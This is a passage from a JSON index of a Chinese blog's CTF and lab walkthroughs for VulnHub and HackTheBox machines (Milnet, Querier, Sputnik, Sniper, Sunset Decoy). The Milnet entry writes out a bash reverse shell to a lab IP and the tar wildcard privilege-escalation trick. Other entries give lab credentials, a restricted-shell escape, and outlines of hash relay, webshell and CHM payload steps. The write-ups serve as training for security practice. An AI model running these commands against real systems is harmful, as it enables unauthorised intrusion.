/\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e就两个端口，直接看80呗：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7fbe03601bbb56b42c0b78c15ce61ea7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e抓包看了一下数据包，发现确实存在远程文件包含：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE05d04d462add4336b384a9e3349da83c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e弹shell吧，这里看报错就可以知道，应该是逻辑处理的地方添加了php后缀：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE71656d2d3631a661ebeb9c498b8e30f3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe7ecf0b20d849e7e0269ce46b445e679%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEba6a7f434d0f879b5652a30810d07096%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查了一些资料，关于tar通配符提权：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/jhinjax/p/17067082.html\"\u003ehttps://www.cnblogs.com/jhinjax/p/17067082.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e第一次尝试失败了，我猜测是下面这个红框里面的原因，没有引号，中间有空格，让人操蛋的是，这玩意儿删不掉：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf645dfaef77a30b8bf4b30a85f0bc5b5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e重置了一下机器，然后这次我加上了引号就可以了\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.5.66/8899 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;\u0026gt;1.sh\r\ntouch \u0026#34;/var/www/html/--checkpoint-action=exec=\u0026#39;sh 1.sh\u0026#39;\u0026#34;\r\ntouch \u0026#34;/var/www/html/--checkpoint=1\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdc5bc44ab35b6d27bcd2826b13b455c1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5bbb080e1c1016fd7bb1b8bce5c06292%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x033 Milnet"},{"content":"端口扫描 获取立足点 值得关注的端口：445、1433、5985\n445：\n用户名：Luis\n不知道为啥，打开是空的：\n但是在windows中打开，发现好像是存在宏：\n使用unzip工具进行提取即可，在提取出来的文件中，可以发现：\nreporting\nPcwTWTHRwryjc$c6\n登录成功：\nxp_cmd无法开启，试着中继了hash:\n破解成功：\ncorporate568 (mssql-svc)\n但是登录失败了：\n试试psexec，也失败了：\n使用新的账户登录MSSQL：\nxp_cmd开启成功：\n通过smb共享，反弹shell回来：\n提权 winpe,\n看起来是打了补丁的，但还是看一下有没有比较好提权的把：\n好像没有，看看其他的：\n简单查了一下，好像是可以提权的：\n接着看：\n失败了：\npsexec，成功了：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x034-querier/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc2717bb159fbd9f01be8956292b90b01image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf5892ddf82aac0abf2a1a26cb399cf97image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6f9de32208211aadbf0563a45c011cfbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注的端口：445、1433、5985\u003c/p\u003e\n\u003cp\u003e445：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa4313eb9098171061865f00046ed4d3cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名：Luis\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE79b050ac91ab01092e5a2f356f179652image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不知道为啥，打开是空的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6972a42e706e1d8e28bfbc761afa1715image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是在windows中打开，发现好像是存在宏：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE20058768812ccb032c9d77dc357dceabimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用unzip工具进行提取即可，在提取出来的文件中，可以发现：\u003c/p\u003e\n\u003cp\u003ereporting\u003c/p\u003e\n\u003cp\u003ePcwTWTHRwryjc$c6\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEacfdd31640226a545cdc7aac5ec6adbfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2645d847fb0ba9683418e008d9f8a268image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003exp_cmd无法开启，试着中继了hash:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe4c3fa49ff4d10b6a0229088f2fb9326image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解成功：\u003c/p\u003e\n\u003cp\u003ecorporate568     (mssql-svc)\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd95c95fba89cec4719cb6873eb751b7bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是登录失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6c179ac5ea28ad2a0a9fe13a61ed64d7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e试试psexec，也失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2a4c206b15df931e7c084fc0208ca632image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用新的账户登录MSSQL：\u003c/p\u003e\n\u003cp\u003exp_cmd开启成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb59b637dc5aaada4c8e8111d337c35c3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过smb共享，反弹shell回来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5a42c25c9604d7fc6daef3e974af42fbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003ewinpe,\u003c/p\u003e\n\u003cp\u003e看起来是打了补丁的，但还是看一下有没有比较好提权的把：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6980fc50ca65e6e95890cb5887e988c7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好像没有，看看其他的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2beb04540ad6d45b006dac833e985fecimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e简单查了一下，好像是可以提权的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe8293bbd2cc028f37bc552d77eade6d6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e接着看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd0eb0cfe25d2a337ca4cafc19b1e53ccimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE73a46b63097aabd443f5dfa829704e42image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003epsexec，成功了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa6258c6dd99b0c4f2c0b9ffed6ebeb76image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X034 Querier"},{"content":"端口扫描 渗透测试 这台靶机的端口很奇葩，而且三个HTTP，直接开始吧\n先把看看nday漏洞，但是没发现有用的东西：\n目录扫描发现有用的东西了.git目录：\n稍微研究一下这个东西怎么利用：\n到这里就误入歧途了，通过工具翻查了半天，然后没找到有用东西，最后无奈看了WP，提示信息在这个文件里面：\n当时看过这个文件，然后看到了ROOT，但是一想没有开放ssh端口，所以就没管，没想到是因为克隆的其他人仓库导致的：\n然后把其他人的仓库克隆下来，再查看日志：\ngit log -p\n不过要吐槽一下，这谁知道是账号密码啊，难不成标准格式就长这样？\n+sputnik:ameer_says_thank_you_and_good_job\n登录后台：\n到这里就可以用已知漏洞了\n这里需要处理一下pip2的问题：\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.py\rsudo python2 get-pip.py 然后下载模块：\n接着下载依赖：\n修改一下代码：\ngetshell:\n提权 秒了\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x034-sputnik-1-/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4e40d195b7a91574331b069e0ff75b22%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE145236ecce5b7c10a067371b943cdf5a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4ec6eb8ba5277c38092995f5b1e178f5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e这台靶机的端口很奇葩，而且三个HTTP，直接开始吧\u003c/p\u003e\n\u003cp\u003e先把看看nday漏洞，但是没发现有用的东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE44c937b5d91911c0a0f738206cf2e69c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e目录扫描发现有用的东西了.git目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE105babf9c7ca7af157473f369427329e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e稍微研究一下这个东西怎么利用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE75d700fbf7dd5ac0d410e58dd266b34f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e到这里就误入歧途了，通过工具翻查了半天，然后没找到有用东西，最后无奈看了WP，提示信息在这个文件里面：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb68a060896131d786c841ffe45949e79%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e当时看过这个文件，然后看到了ROOT，但是一想没有开放ssh端口，所以就没管，没想到是因为克隆的其他人仓库导致的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6a1e5a5757e8e8ca4558c20ce46777b8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后把其他人的仓库克隆下来，再查看日志：\u003c/p\u003e\n\u003cp\u003egit log -p\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8dc1c87f6fbc9f9f0ed81ddf5f13aaf5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不过要吐槽一下，这谁知道是账号密码啊，难不成标准格式就长这样？\u003c/p\u003e\n\u003cp\u003e+sputnik:ameer_says_thank_you_and_good_job\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1b02d91bba0cea95ad565527cbf7f34e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录后台：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE988a1f40ac2ec781a44c71a411a06f17%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e到这里就可以用已知漏洞了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8045bf7cde54279b8a9c879c005e4116%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里需要处理一下pip2的问题：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewget https://bootstrap.pypa.io/pip/2.7/get-pip.py\r\nsudo python2 get-pip.py\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE114203728c63af1c0dcfe0a4e6f0f674%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后下载模块：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa9ff4adbb4dc1abf9f500736a45bf20e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e接着下载依赖：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfa3c4633e94e01218c4f0da8da0693a2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8d7f8c200a47ff8eb8e4420f52a42db4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7ad0feac33962d493006c2d3466ab8fc%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE68edc12a743e5e98b2d4250e1ea1729a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改一下代码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE53f2d2ec4ea87c219629c6c3499d0475%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003egetshell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3da457feb327417cd2f4651c00c83f29%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e秒了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcd4529348a7956f70436a5c780863d5f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3513a6ba57ac13425ab9cb4eca585f81%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x034 Sputnik 1 "},{"content":"端口扫描 获取立足点 值得关注端口：80、445：\n445：\n80：\n发现文件包含：\n经过测试远程文件包含不存在，那么该如何getshell呢？\n读取session文件：\n发现里面有我们的名字，于是，我们可以在这里面写入webshell，反弹shell:\n大概就是传入nc，然后反弹：\n数据库账号密码：\n这个密码是Chris用户的密码：\n使用powershell弹个Chris的shell回来：\n直接调用temp里面的失败了：\n得重新下一个到Chris的目录里面：\n提权 常规提权思路无果，需要信息收集：\n其实这里的意思是，让我们做一个帮助文档，然后会有人查看这个文档，结合downloads里面的chm文档，上面应该放置的就是这个文档，我们需要利用chm做一个payload：\n后续使用htmlhelp.exe来进行制作，然后就可以获取到administrator的ntlmhash进行破解即可：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x035-sniper/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE20b61384be2dcd3300751271b979708fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE94818edea997aaa6c02110672ea8a3e7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE32f6533e95fc2a071e14a07191136763image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注端口：80、445：\u003c/p\u003e\n\u003cp\u003e445：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE561c3c4f7e0f862188ee76a9da3fa392image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3e935eb2a42bcede5cdca66ad468fb72image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0854af8da2254fde4e8682825de83667image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现文件包含：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb4e4391a1d22e7fc62bec8c352c7efe8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e经过测试远程文件包含不存在，那么该如何getshell呢？\u003c/p\u003e\n\u003cp\u003e读取session文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE715f79d4a6643651f118b5bb71966cb8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现里面有我们的名字，于是，我们可以在这里面写入webshell，反弹shell:\u003c/p\u003e\n\u003cp\u003e大概就是传入nc，然后反弹：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEea4b53a25034134e89de1cd3c119e533image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e数据库账号密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5e49f988b69e8b1621324f9b2e7114ebimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个密码是Chris用户的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEca5132517c6753321883ec10b92a0450image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用powershell弹个Chris的shell回来：\u003c/p\u003e\n\u003cp\u003e直接调用temp里面的失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE61c9060dafa18695af5b56a0b89e8839image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e得重新下一个到Chris的目录里面：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE99c632406bcb6160a0721975c2ae5c93image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e常规提权思路无果，需要信息收集：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE03f9e29a5be930b0cb46796178fa777cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e其实这里的意思是，让我们做一个帮助文档，然后会有人查看这个文档，结合downloads里面的chm文档，上面应该放置的就是这个文档，我们需要利用chm做一个payload：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb7cca88758e4558e97a83032bc41616aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后续使用htmlhelp.exe来进行制作，然后就可以获取到administrator的ntlmhash进行破解即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE70e8271e92b629901057130b90db7884image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X035 Sniper"},{"content":"端口扫描 渗透测试 目录扫描没发现东西，\n然后看了一下，是目录浏览，没有继续扫的必要了：\n需要密码：\n破解\nshadow账号就这两个，破解一下试试把：\n爆破shadow密码：\njohn shadow --format=crypt --wordlist=/usr/share 出现密码:\n296640a3b825115a47b68fc44501c828\nserver\n登录成功：\n提权 上来发现是受限的shell，想办法逃逸一下：\n发现文章：\nhttps://blog.csdn.net/qq_43168364/article/details/111830233\nsh 296640a3b825115a47b68fc44501c828@192.168.5.101 \u0026#34;bash --noprofile\u0026#34; 一个哑shell，升级成交互式shell，然后环境变量又没了，恢复一下\nexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr SUID和sudo无果，有GCC，来个内核提权吧：\nCVE-2021-4034秒了\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x035-sunset-decoy/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE099bd507449b73081ce8f37bb0c3b667%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4ed549d6c8935a50f5a62ae9788818d1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE712433f17ff09c37753a77f69697e0a3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e目录扫描没发现东西，\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd227bd235445cdae1bb35ab4796d32e4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEba3ec5c726f1c67862a1026106044d8f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后看了一下，是目录浏览，没有继续扫的必要了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7cefd82800ac58b0887f66f81d8f9155%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e需要密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE56ddbc7b1f25e43d175564d98016075b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE059f6a976e7736b356a4c26d5a786783%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE99d9883f9e9f42e234f6d84c8558e272%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eshadow账号就这两个，破解一下试试把：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd0117c14613feb84e5fe4ddf79949c34%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破shadow密码：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejohn shadow --format=crypt --wordlist=/usr/share\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e出现密码:\u003c/p\u003e\n\u003cp\u003e296640a3b825115a47b68fc44501c828\u003c/p\u003e\n\u003cp\u003eserver\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5249ccc4c52791fa67f13347c10e98f2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5ac0ac186ebba33b81881c96ed937cfb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e上来发现是受限的shell，想办法逃逸一下：\u003c/p\u003e\n\u003cp\u003e发现文章：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/qq_43168364/article/details/111830233\"\u003ehttps://blog.csdn.net/qq_43168364/article/details/111830233\u003c/a\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esh 296640a3b825115a47b68fc44501c828@192.168.5.101 \u0026#34;bash --noprofile\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb8036cbe20c42bf6425eef9ca19517b3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e一个哑shell，升级成交互式shell，然后环境变量又没了，恢复一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcdeb4b007f8bf7bdb104ae14a4a7f48a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSUID和sudo无果，有GCC，来个内核提权吧：\u003c/p\u003e\n\u003cp\u003eCVE-2021-4034秒了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 